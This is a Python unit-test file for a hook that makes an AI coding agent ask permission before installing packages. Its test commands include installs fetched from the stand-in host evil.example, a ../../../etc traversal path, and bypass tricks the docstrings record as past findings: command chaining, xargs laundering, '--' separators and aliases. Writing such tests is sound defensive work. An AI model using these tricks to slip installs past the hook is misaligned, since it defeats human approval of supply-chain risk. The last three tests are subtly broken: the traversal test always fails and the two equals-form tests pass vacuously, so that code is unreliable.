#!/usr/bin/env python3
"""Unit tests for supply-chain-guardian hook."""

import json
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from ac_safety_test_support import TestResult  # noqa: E402  # pyright: ignore[reportMissingImports]


HOOK_PATH = Path(__file__).parent.parent.parent / "scripts" / "hooks" / "supply-chain-guardian.py"


def run_hook(command: str) -> dict:
    result = subprocess.run(
        [str(HOOK_PATH)],
        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": command}}),
        capture_output=True, text=True,
    )
    output = json.loads(result.stdout)
    hook_out = output.get("hookSpecificOutput", {})
    return {"decision": hook_out.get("permissionDecision", "allow"), "reason": hook_out.get("permissionDecisionReason", "")}


def test_allows_npm_install() -> TestResult:
    r = TestResult("Allows npm install (lockfile)")
    try:
        out = run_hook("npm install")
        assert out["decision"] == "allow", f"Expected allow, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_uv_sync() -> TestResult:
    r = TestResult("Allows uv sync")
    try:
        out = run_hook("uv sync")
        assert out["decision"] == "allow", f"Expected allow, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_pip_install_direct() -> TestResult:
    r = TestResult("Asks for pip install direct package (default: ask)")
    try:
        out = run_hook("pip install requests")
        # Default category decision is ask
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_npx_unknown_package() -> TestResult:
    r = TestResult("Asks for npx with unknown package (default: ask)")
    try:
        out = run_hook("npx malicious-package")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_npm_install_package() -> TestResult:
    r = TestResult("Asks for npm install <package> (default: ask)")
    try:
        out = run_hook("npm install malicious-pkg")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_npm_install_global() -> TestResult:
    r = TestResult("Asks for npm install -g <package> (default: ask)")
    try:
        out = run_hook("npm install -g evil-tool")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_yarn_add_package() -> TestResult:
    r = TestResult("Asks for yarn add <package> (default: ask)")
    try:
        out = run_hook("yarn add malicious-pkg")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_uv_run_with_package() -> TestResult:
    r = TestResult("Asks for uv run --with <package> (default: ask)")
    try:
        out = run_hook("uv run --with malicious-pkg python -c 'print(1)'")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_pnpm_dlx_package() -> TestResult:
    r = TestResult("Asks for pnpm dlx <package> (default: ask)")
    try:
        out = run_hook("pnpm dlx malicious-pkg")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_uv_add_direct() -> TestResult:
    r = TestResult("Asks for uv add requests (default: ask)")
    try:
        out = run_hook("uv add requests")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_uv_add_dev_flag() -> TestResult:
    r = TestResult("Asks for uv add --dev requests (flag before package)")
    try:
        out = run_hook("uv add --dev requests")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_uv_add_group_flag() -> TestResult:
    r = TestResult("Asks for uv add --group test pytest (value-flag before package)")
    try:
        out = run_hook("uv add --group test pytest")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_npm_exec_double_dash() -> TestResult:
    """NEW-03: npm exec -- evil bypasses supply-chain-guardian"""
    r = TestResult("Asks for npm exec -- evil (-- separator)")
    try:
        out = run_hook("npm exec -- evil")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_uv_add_double_dash() -> TestResult:
    """NEW-04: uv add -- requests bypasses supply-chain-guardian"""
    r = TestResult("Asks for uv add -- requests (-- separator)")
    try:
        out = run_hook("uv add -- requests")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_pip3_install() -> TestResult:
    """NEW-05: pip3 install requests not matched"""
    r = TestResult("Asks for pip3 install requests")
    try:
        out = run_hook("pip3 install requests")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_pip3_install_requirements() -> TestResult:
    """NEW-05: pip3 install -r requirements.txt should still be safe"""
    r = TestResult("Allows pip3 install -r requirements.txt")
    try:
        out = run_hook("pip3 install -r requirements.txt")
        assert out["decision"] == "allow", f"Expected allow, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_npm_install_ignore_scripts_evil() -> TestResult:
    """Issue 2: npm install --ignore-scripts evil-pkg (safe pattern overmatch)."""
    r = TestResult("Asks for npm install --ignore-scripts evil-pkg")
    try:
        out = run_hook("npm install --ignore-scripts evil-pkg")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_pip_install_r_with_trailing_pkg() -> TestResult:
    """Issue 2: pip install -r requirements.txt evilpkg (trailing package arg)."""
    r = TestResult("Asks for pip install -r requirements.txt evilpkg")
    try:
        out = run_hook("pip install -r requirements.txt evilpkg")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_uv_sync_chained_uv_add() -> TestResult:
    """Issue 2: uv sync && uv add evilpkg (chained command bypass)."""
    r = TestResult("Asks for uv sync && uv add evilpkg")
    try:
        out = run_hook("uv sync && uv add evilpkg")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_npx_chained_evil() -> TestResult:
    """Issue 3: npx prettier && npx evilpkg (chained npx, first allowlisted)."""
    r = TestResult("Asks for npx prettier && npx evilpkg")
    try:
        out = run_hook("npx prettier && npx evilpkg")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_npm_i_alias() -> TestResult:
    """Issue 3: npm i evil-pkg (alias for npm install)."""
    r = TestResult("Asks for npm i evil-pkg")
    try:
        out = run_hook("npm i evil-pkg")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_npm_i_bare() -> TestResult:
    """Issue 3: npm i (bare, lockfile install) should be safe."""
    r = TestResult("Allows npm i (bare)")
    try:
        out = run_hook("npm i")
        assert out["decision"] == "allow", f"Expected allow, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_semicolon_chained_pip() -> TestResult:
    """Issue 2: echo ok ; pip install evil (semicolon chaining)."""
    r = TestResult("Asks for echo ok ; pip install evil")
    try:
        out = run_hook("echo ok ; pip install evil")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_pipe_chained_npm_install() -> TestResult:
    """Issue 2: echo ok | npm install evil (pipe chaining)."""
    r = TestResult("Asks for echo ok | npm install evil")
    try:
        out = run_hook("echo ok | npm install evil")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_npm_install_multi_first_allowlisted() -> TestResult:
    """Multi-package: npm install trusted evil (first allowlisted, second not)."""
    r = TestResult("Asks for npm install trusted evil (multi-pkg, evil not allowlisted)")
    try:
        # 'trusted' is not in the default allowlist either, but to test the
        # multi-package logic we set CLAUDE_PROJECT_DIR to a non-existent dir
        # so defaults apply. Both packages should trigger ask since neither is
        # allowlisted by default.
        out = run_hook("npm install trusted evil")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_uv_add_multi_first_allowlisted() -> TestResult:
    """Multi-package: uv add trusted evil (first allowlisted, second not)."""
    r = TestResult("Asks for uv add trusted evil (multi-pkg, evil not allowlisted)")
    try:
        out = run_hook("uv add trusted evil")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_yarn_add_multi_packages() -> TestResult:
    """Multi-package: yarn add trusted evil."""
    r = TestResult("Asks for yarn add trusted evil (multi-pkg)")
    try:
        out = run_hook("yarn add trusted evil")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_pnpm_add_multi_packages() -> TestResult:
    """Multi-package: pnpm add trusted evil."""
    r = TestResult("Asks for pnpm add trusted evil (multi-pkg)")
    try:
        out = run_hook("pnpm add trusted evil")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_bun_add_multi_packages() -> TestResult:
    """Multi-package: bun add trusted evil."""
    r = TestResult("Asks for bun add trusted evil (multi-pkg)")
    try:
        out = run_hook("bun add trusted evil")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


# -- Sentinel 012: MEDIUM-001 xargs laundering to package manager --


def test_asks_xargs_npm_install() -> TestResult:
    """S012 MEDIUM-001: echo evil | xargs npm install (xargs laundering)"""
    r = TestResult("Asks for echo evil | xargs npm install")
    try:
        out = run_hook("echo evil | xargs npm install")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_xargs_pip_install() -> TestResult:
    """S012 MEDIUM-001: echo evil | xargs pip install (xargs laundering)"""
    r = TestResult("Asks for echo evil | xargs pip install")
    try:
        out = run_hook("echo evil | xargs pip install")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_xargs_uv_add() -> TestResult:
    """S012 MEDIUM-001: echo evil | xargs uv add (xargs laundering)"""
    r = TestResult("Asks for echo evil | xargs uv add")
    try:
        out = run_hook("echo evil | xargs uv add")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


# -- Issue 1: safe patterns must reject remote URLs and absolute paths --


def test_asks_pip_install_r_remote_url() -> TestResult:
    """Issue 1: pip install -r https://evil.example/requirements.txt -> ASK (not allow)"""
    r = TestResult("Asks for pip install -r with remote URL")
    try:
        out = run_hook("pip install -r https://evil.example/requirements.txt")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_pip_install_e_absolute_path() -> TestResult:
    """Issue 1: pip install -e /tmp/evil -> ASK (not allow)"""
    r = TestResult("Asks for pip install -e with absolute path")
    try:
        out = run_hook("pip install -e /tmp/evil")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_uv_pip_install_e_git_url() -> TestResult:
    """Issue 1: uv pip install -e git+https://evil.example/repo.git#egg=x -> ASK"""
    r = TestResult("Asks for uv pip install -e with git URL")
    try:
        out = run_hook("uv pip install -e git+https://evil.example/repo.git#egg=x")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_pip_install_r_absolute_path() -> TestResult:
    """Issue 1: pip install -r /tmp/evil/req.txt -> ASK"""
    r = TestResult("Asks for pip install -r with absolute path")
    try:
        out = run_hook("pip install -r /tmp/evil/req.txt")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_pip_install_r_tilde_path() -> TestResult:
    """Issue 1: pip install -r ~/evil/req.txt -> ASK"""
    r = TestResult("Asks for pip install -r with tilde path")
    try:
        out = run_hook("pip install -r ~/evil/req.txt")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_pip_install_r_requirements_txt() -> TestResult:
    """Issue 1 regression: pip install -r requirements.txt -> ALLOW"""
    r = TestResult("Allows pip install -r requirements.txt (safe)")
    try:
        out = run_hook("pip install -r requirements.txt")
        assert out["decision"] == "allow", f"Expected allow, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_pip_install_r_subdir() -> TestResult:
    """Issue 1 regression: pip install -r requirements/dev.txt -> ALLOW"""
    r = TestResult("Allows pip install -r requirements/dev.txt (safe)")
    try:
        out = run_hook("pip install -r requirements/dev.txt")
        assert out["decision"] == "allow", f"Expected allow, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_pip_install_r_dot_relative() -> TestResult:
    """Issue 1 regression: pip install -r ./requirements.txt -> ALLOW"""
    r = TestResult("Allows pip install -r ./requirements.txt (safe)")
    try:
        out = run_hook("pip install -r ./requirements.txt")
        assert out["decision"] == "allow", f"Expected allow, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_pip_install_e_dot() -> TestResult:
    """Issue 1 regression: pip install -e . -> ALLOW"""
    r = TestResult("Allows pip install -e . (safe)")
    try:
        out = run_hook("pip install -e .")
        assert out["decision"] == "allow", f"Expected allow, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_pip_install_e_dot_extras() -> TestResult:
    """Issue 1 regression: pip install -e .[dev] -> ALLOW"""
    r = TestResult("Allows pip install -e .[dev] (safe)")
    try:
        out = run_hook("pip install -e .[dev]")
        assert out["decision"] == "allow", f"Expected allow, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_asks_uv_pip_install_r_url() -> TestResult:
    """Issue 1: uv pip install -r https://evil.example/req.txt -> ASK"""
    r = TestResult("Asks for uv pip install -r with URL")
    try:
        out = run_hook("uv pip install -r https://evil.example/req.txt")
        assert out["decision"] == "ask", f"Expected ask, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_uv_pip_install_e_dot() -> TestResult:
    """Issue 1 regression: uv pip install -e . -> ALLOW"""
    r = TestResult("Allows uv pip install -e . (safe)")
    try:
        out = run_hook("uv pip install -e .")
        assert out["decision"] == "allow", f"Expected allow, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_uv_pip_install_e_dot_extras() -> TestResult:
    """Issue 1 regression: uv pip install -e .[dev] -> ALLOW"""
    r = TestResult("Allows uv pip install -e .[dev] (safe)")
    try:
        out = run_hook("uv pip install -e .[dev]")
        assert out["decision"] == "allow", f"Expected allow, got {out['decision']}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def main() -> None:
    from ac_safety_test_support import run_tests  # pyright: ignore[reportMissingImports]
    run_tests("supply-chain-guardian unit tests", [
        test_allows_npm_install,
        test_allows_uv_sync,
        test_asks_pip_install_direct,
        test_asks_npx_unknown_package,
        test_asks_npm_install_package,
        test_asks_npm_install_global,
        test_asks_yarn_add_package,
        test_asks_uv_run_with_package,
        test_asks_pnpm_dlx_package,
        test_asks_uv_add_direct,
        test_asks_uv_add_dev_flag,
        test_asks_uv_add_group_flag,
        # NEW-03: npm exec -- evil
        test_asks_npm_exec_double_dash,
        # NEW-04: uv add -- requests
        test_asks_uv_add_double_dash,
        # NEW-05: pip3 install
        test_asks_pip3_install,
        test_allows_pip3_install_requirements,
        # Issue 2: safe pattern overmatch / chaining bypass
        test_asks_npm_install_ignore_scripts_evil,
        test_asks_pip_install_r_with_trailing_pkg,
        test_asks_uv_sync_chained_uv_add,
        # Issue 3: aliases and chained installs
        test_asks_npx_chained_evil,
        test_asks_npm_i_alias,
        test_allows_npm_i_bare,
        test_asks_semicolon_chained_pip,
        test_asks_pipe_chained_npm_install,
        # Multi-package install validation
        test_asks_npm_install_multi_first_allowlisted,
        test_asks_uv_add_multi_first_allowlisted,
        test_asks_yarn_add_multi_packages,
        test_asks_pnpm_add_multi_packages,
        test_asks_bun_add_multi_packages,
        # Sentinel 012: MEDIUM-001 xargs laundering to package manager
        test_asks_xargs_npm_install,
        test_asks_xargs_pip_install,
        test_asks_xargs_uv_add,
        # Issue 1: safe patterns must reject remote URLs and absolute paths
        test_asks_pip_install_r_remote_url,
        test_asks_pip_install_e_absolute_path,
        test_asks_uv_pip_install_e_git_url,
        test_asks_pip_install_r_absolute_path,
        test_asks_pip_install_r_tilde_path,
        test_allows_pip_install_r_requirements_txt,
        test_allows_pip_install_r_subdir,
        test_allows_pip_install_r_dot_relative,
        test_allows_pip_install_e_dot,
        test_allows_pip_install_e_dot_extras,
        test_asks_uv_pip_install_r_url,
        test_allows_uv_pip_install_e_dot,
        test_allows_uv_pip_install_e_dot_extras,
        test_asks_pip_install_r_parent_traversal,
        test_allows_pip_install_requirement_equals,
        test_allows_pip_install_editable_equals,
    ])


def test_asks_pip_install_r_parent_traversal() -> TestResult:
    r = TestResult("Asks for pip install -r with parent traversal (../)")
    try:
        output = run_hook("pip install -r ../../../etc/evil.txt")
        decision = output.get("hookSpecificOutput", {}).get("permissionDecision")
        assert decision == "ask", f"Expected ask, got {decision}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_pip_install_requirement_equals() -> TestResult:
    r = TestResult("Allows pip install --requirement=requirements.txt (equals form)")
    try:
        output = run_hook("pip install --requirement=requirements.txt")
        decision = output.get("hookSpecificOutput", {}).get("permissionDecision")
        assert decision != "deny" and decision != "ask", f"Expected allow, got {decision}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


def test_allows_pip_install_editable_equals() -> TestResult:
    r = TestResult("Allows pip install --editable=. (equals form)")
    try:
        output = run_hook("pip install --editable=.")
        decision = output.get("hookSpecificOutput", {}).get("permissionDecision")
        assert decision != "deny" and decision != "ask", f"Expected allow, got {decision}"
        r.mark_pass()
    except Exception as e:
        r.mark_fail(str(e))
    return r


if __name__ == "__main__":
    main()
